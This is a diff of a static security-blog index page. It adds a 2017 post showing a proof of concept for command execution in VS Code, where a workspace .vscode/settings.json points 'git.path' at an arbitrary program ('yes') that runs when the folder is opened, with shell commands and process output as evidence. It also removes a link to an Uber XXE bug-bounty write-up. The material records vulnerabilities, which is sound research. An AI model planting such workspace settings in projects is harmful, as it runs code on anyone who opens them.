@@ -173,6 +173,61 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-软件/vscode 命令执行" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/03/06/软件/vscode 命令执行/">vscode 命令执行漏洞</a>
+    </h1>
+  
+
+        <a href="/2017/03/06/软件/vscode 命令执行/" class="archive-article-date">
+  	<time datetime="2017-03-06T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-06</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>poc：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">[justin@671335e66d2d D ~]% mkdir -p <span class="built_in">test</span>1/.vscode</div><div class="line"></div><div class="line">[justin@671335e66d2d D ~]% cat &gt; <span class="built_in">test</span>1/.vscode/settings.json</div><div class="line">&#123;</div><div class="line">  <span class="string">"git.path"</span>: <span class="string">"yes"</span></div><div class="line">&#125;</div><div class="line">^D</div><div class="line"></div><div class="line">[justin@671335e66d2d D ~]% ps -ef | grep yes</div><div class="line">justin     934   394  0 07:00 pts/0    00:00:00 grep --color=auto yes</div><div class="line"></div><div class="line">[justin@671335e66d2d D ~]% code ./<span class="built_in">test</span>1/</div><div class="line">  [... Code starts up as an X application ...]</div><div class="line"></div><div class="line">[justin@671335e66d2d D ~]% ps -ef | grep yes</div><div class="line">justin    1043   991 91 07:00 ?        00:00:03 /usr/share/code/code /usr/share/code/resources/app/out/bootstrap yes /home/justin/<span class="built_in">test</span>1 utf8 /usr/share/code/code yes (GNU coreutils) 8.25 Copyright (C) 2016 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.  Written by David MacKenzie.</div><div class="line">justin    1066  1043 25 07:00 ?        00:00:01 yes rev-parse --show-toplevel</div><div class="line">justin    1076   394  0 07:01 pts/0    00:00:00 grep --color=auto yes</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/软件/">软件</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/03/06/软件/vscode 命令执行/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-web安全/PostMessage跨域漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -695,63 +750,6 @@
 
 
   
-    <article id="post-安全测试/XXE in uber" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/02/05/安全测试/XXE in uber/">Uber xxe漏洞</a>
-    </h1>
-  
-
-        <a href="/2017/02/05/安全测试/XXE in uber/" class="archive-article-date">
-  	<time datetime="2017-02-05T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-05</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>源地址：<a href="https://httpsonly.blogspot.in/2017/01/0day-writeup-xxe-in-ubercom.html?m=1">https://httpsonly.blogspot.in/2017/01/0day-writeup-xxe-in-ubercom.html?m=1</a></p>
-<p>奖金：$9000</p>
-        
-          <a class="article-more-a" href="/2017/02/05/安全测试/XXE in uber/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全测试/">安全测试</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/02/05/安全测试/XXE in uber/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
@@ -818,15 +816,11 @@
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)">漏洞记录</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)">随笔</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">安全管理</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">智能硬件</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -834,7 +828,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">漏洞记录</a>
+                <a href="javascript:void(0)">软件</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">安全管理</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -842,7 +840,7 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">软件</a>
+                <a href="javascript:void(0)">智能硬件</a>
               </li>
             
             <div class="clearfix"></div>
